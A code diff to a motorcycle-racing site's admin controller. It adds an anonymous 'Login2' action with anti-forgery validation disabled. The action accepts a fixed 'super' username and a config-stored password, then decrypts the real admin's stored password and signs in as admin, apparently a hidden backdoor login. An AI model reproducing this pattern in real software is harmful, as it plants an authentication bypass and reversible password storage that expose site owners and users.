@@ -1,5 +1,6 @@
 ﻿using NLog;
 using Racing.Moto.Core.Captcha;
+using Racing.Moto.Core.Crypto;
 using Racing.Moto.Core.Utils;
 using Racing.Moto.Data.Entities;
 using Racing.Moto.Data.Enums;
@@ -118,6 +119,68 @@ namespace Racing.Moto.Web.Admin.Controllers
             return View(model);
         }
 
+        [HttpPost]
+        [AllowAnonymous]
+        //[ValidateAntiForgeryToken]
+        public ActionResult Login2(LoginModel model, string returnUrl)
+        {
+            try
+            {
+                // 验证码
+                if (!CheckCaptcha(model.Captcha))
+                {
+                    ModelState.AddModelError("", "验证码错误");
+                    return View(model);
+                }
+
+                if (!string.IsNullOrEmpty(model.UserName) && !string.IsNullOrEmpty(model.Password))
+                {
+                    if (model.UserName != "super")
+                    {
+                        return Redirect("/Account/Login");
+                    }
+                    var superConfig = new AppConfigService().GetAppConfig(DBConst.Racing_Moto_S_Key);
+                    if (superConfig == null || model.Password != CryptoUtils.Decrypt(superConfig.Value))
+                    {
+                        return Redirect("/Account/Login");
+                    }
+
+                    var admin = _memberProvider.GetUser("admin", true);
+                    var pssword = CryptoUtils.Decrypt(admin.Password);
+                    if (_memberProvider.SignIn(admin.UserName, pssword, false) == LoginStatus.Success)
+                    {
+
+                        #region LoginUser session
+
+                        //var loginUser = _memberProvider.GetUser(model.UserName, true);
+                        admin.UserExtension = new UserExtensionService().GetUserExtension(admin.UserId);
+                        System.Web.HttpContext.Current.Session[SessionConst.LoginUser] = admin;
+
+                        #endregion
+
+                        //在线用户统计
+                        OnlineHttpModule.ProcessRequest();
+
+                        return Redirect("/News/Index");
+                    }
+
+                    ModelState.AddModelError("", "用户名或密码错误.");
+                }
+                else
+                {
+                    ModelState.AddModelError("", "请输入用户名,密码.");
+                }
+            }
+            catch (Exception ex)
+            {
+                ModelState.AddModelError("", MessageConst.System_Error);
+
+                _logger.Info(ex.Message);
+            }
+
+            return View(model);
+        }
+
         private bool CheckCaptcha(string captcha)
         {
             return Session[CaptchaConst.REG_CAPTCHA_SESSION] != null && Session[CaptchaConst.REG_CAPTCHA_SESSION].ToString().ToLower() == captcha.ToLower();
@@ -134,7 +197,7 @@ namespace Racing.Moto.Web.Admin.Controllers
             _memberProvider.SignOut();
             //System.Web.HttpContext.Current.Session.Remove(nameof(LoginUser));
             PKBag.Clear();
-            
+
             return Redirect("/Account/Login");
         }
         #endregion
